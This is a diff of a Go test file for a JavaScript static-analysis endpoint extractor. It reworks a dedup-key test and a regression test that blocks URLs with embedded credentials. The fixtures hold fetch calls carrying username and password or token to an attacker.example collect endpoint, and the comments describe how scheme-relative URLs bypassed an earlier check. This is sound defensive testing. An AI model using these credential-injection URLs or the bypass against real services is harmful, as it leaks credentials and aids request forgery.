@@ -15,8 +15,11 @@
 package jsstatic
 
 import (
+	"context"
 	"strings"
 	"testing"
+
+	"github.com/praetorian-inc/vespasian/pkg/crawl"
 )
 
 // helper: find the first endpoint matching the given URL (or all if wantURL is "").
@@ -965,26 +968,30 @@ func TestConcatDedupKey_RootSlashPreserved(t *testing.T) {
 		t.Errorf("concatDedupKey(%q, %q) = %q, want %q", "/", "example.com", got, "example.com|/")
 	}
 
-	// TEST-002: the inner `trimmed != ""` guard was unreachable from either root
-	// test, so nothing pinned what a slashes-only path produces. "//" must key the
-	// same as "/" — the trailing-slash trim empties it and the guard restores the
-	// root form — otherwise a root-ish AST URL and a root-ish concat
-	// reconstruction would land in different buckets and the phantom-GET dedup
-	// would miss.
-	if got := concatDedupKey("//", "example.com"); got != "example.com|/" {
-		t.Errorf("concatDedupKey(%q, %q) = %q, want %q (must key as the root path)",
-			"//", "example.com", got, "example.com|/")
-	}
-	// Same for an absolute URL whose path is a bare root.
-	if got := concatDedupKey("https://example.com/", "example.com"); got != "example.com|/" {
+	// TEST-002: pin the inner `trimmed != ""` guard with inputs that actually
+	// REACH it. The previous attempt used "//" and "https://example.com/", neither
+	// of which gets there: url.Parse("//") yields Host="" Path="", so the
+	// leading-slash normalization makes path "/" and the OUTER `path != "/"` check
+	// short-circuits before the trailing-slash trim; "https://example.com/" yields
+	// Path="/" and short-circuits identically. Mutation-tested: with those cases,
+	// replacing the guarded trim with a bare strings.TrimRight left all 18 packages
+	// green, so the branch was still unpinned.
+	//
+	// These two inputs do reach the trim: Path="//" and Path="///" respectively.
+	// Behavior is pinned as OBSERVED — a slashes-only path is not something the
+	// extractors emit (cleanConcatPath collapses runs and then fails
+	// hasAPIIndicator), so the point is to detect a change in the branch, not to
+	// bless these keys as meaningful.
+	if got := concatDedupKey("https://example.com//", "example.com"); got != "example.com|//" {
 		t.Errorf("concatDedupKey(%q, %q) = %q, want %q",
-			"https://example.com/", "example.com", got, "example.com|/")
+			"https://example.com//", "example.com", got, "example.com|//")
+	}
+	if got := concatDedupKey("///", "example.com"); got != "example.com|///" {
+		t.Errorf("concatDedupKey(%q, %q) = %q, want %q",
+			"///", "example.com", got, "example.com|///")
 	}
 }
 
-// QUAL-001: concatDedupKey must collapse a trailing-slash key onto its
-// non-trailing-slash counterpart directly (unit-level pin, complementing the
-// end-to-end TestExtractFromBundle_ConcatNoPhantomForTrailingSlash above).
 func TestConcatDedupKey_TrailingSlashNormalized(t *testing.T) {
 	withSlash := concatDedupKey("/api/posts/{id}/comment/", "example.com")
 	withoutSlash := concatDedupKey("/api/posts/{id}/comment", "example.com")
@@ -993,35 +1000,50 @@ func TestConcatDedupKey_TrailingSlashNormalized(t *testing.T) {
 	}
 }
 
-// TestExtractFromBundle_ASTAbsoluteCredentialGate is the regression guard for the
-// second-pass SEC-BE-001 finding: the first pass gated only the concat
-// reconstructions of ExtractFromBundle step 5, leaving the AST walkers of steps
-// 1, 3 and 4 emitting absolute URLs with embedded credentials.
+// TestAnalyze_AbsoluteCredentialGate is the regression guard for the
+// credential-injection vector (SEC-BE-001), now asserted at the SYNTHESIS level
+// because that is where the gate lives.
 //
-// That mattered because classify Rule 7 floors EVERY IsJSStaticSource candidate
-// with an API-indicator path to the default --confidence, so such a candidate
-// reached OptionsProbe.probeURL — where ssrf.ValidateURL screens only scheme and
-// resolved IP, never u.User, and probe.Config.AuthHeaders is set by no non-test
-// caller — making net/http derive `Authorization: Basic <base64(userinfo)>` from
-// req.URL.User on every probe. rejectUnsafeAbsolute now applies
-// crawl.ValidateFullURL at the single choke point covering all producers.
-func TestExtractFromBundle_ASTAbsoluteCredentialGate(t *testing.T) {
-	src := []byte(`
-fetch("https://u:p@attacker.example/api/collect");
-fetch("https://token@attacker.example/api/beacon");
-axios.get("https://u:p@example.com/api/self");
-var tpl = fetch(` + "`https://u:p@example.com/api/${id}/tpl`" + `);
-`)
-	endpoints, err := ExtractFromBundle(src, "https://example.com/app.js")
+// It deliberately does NOT call ExtractFromBundle. The gate was moved into
+// toRequests, on the RESOLVED URL, precisely because the previous
+// ExtractFromBundle-level version was bypassable: it keyed off an http(s)://
+// prefix, so a scheme-relative literal skipped it entirely and then
+// resolveURL's base.ResolveReference copied ref.User and reinstated the base
+// scheme — reconstituting the credential URL after the check had run. A test
+// written against ExtractFromBundle cannot see that, which is exactly why the
+// bypass shipped green last pass.
+//
+// Why it matters: classify Rule 7 floors any IsJSStaticSource candidate with an
+// API-indicator path to the default --confidence, so such a URL reaches
+// OptionsProbe.probeURL, where ssrf.ValidateURL never inspects u.User and
+// probe.Config.AuthHeaders is set by no non-test caller — making net/http derive
+// `Authorization: Basic <base64(userinfo)>` from req.URL.User on every probe.
+//
+// The scheme-relative fixtures are the ones that regressed; keep them.
+func TestAnalyze_AbsoluteCredentialGate(t *testing.T) {
+	js := `fetch("//u:p@attacker.example/api/collect");` +
+		`fetch("//token@attacker.example/api/beacon");` +
+		`fetch("https://u:p@attacker.example/api/explicit");` +
+		`fetch("HTTPS://u:p@attacker.example/api/upper");` +
+		`axios.get("https://u:p@app.example.com/api/self");` +
+		"var t = fetch(`https://u:p@app.example.com/api/${id}/tpl`);"
+
+	res, err := Analyze(context.Background(), []crawl.ObservedRequest{{
+		Method: "GET", URL: "https://app.example.com/app.js", Source: "burp",
+		Response: crawl.ObservedResponse{
+			StatusCode: 200, ContentType: "application/javascript", Body: []byte(js),
+		},
+	}}, Options{})
 	if err != nil {
-		t.Fatalf("unexpected error: %v", err)
+		t.Fatalf("Analyze: %v", err)
 	}
 
-	// No producer may emit userinfo, whether the host is the bundle's own or not.
-	for _, ep := range endpoints {
-		if strings.Contains(ep.URL, "@") {
-			t.Errorf("endpoint with embedded credentials must NOT be emitted; got %q (source %q) in %v",
-				ep.URL, ep.SourceTag, endpoints)
+	for _, r := range res.Requests {
+		if !crawl.IsJSStaticSource(r.Source) {
+			continue
+		}
+		if strings.Contains(r.URL, "@") {
+			t.Errorf("synthesized request carries embedded credentials: %q (source %q)", r.URL, r.Source)
 		}
 	}
 }
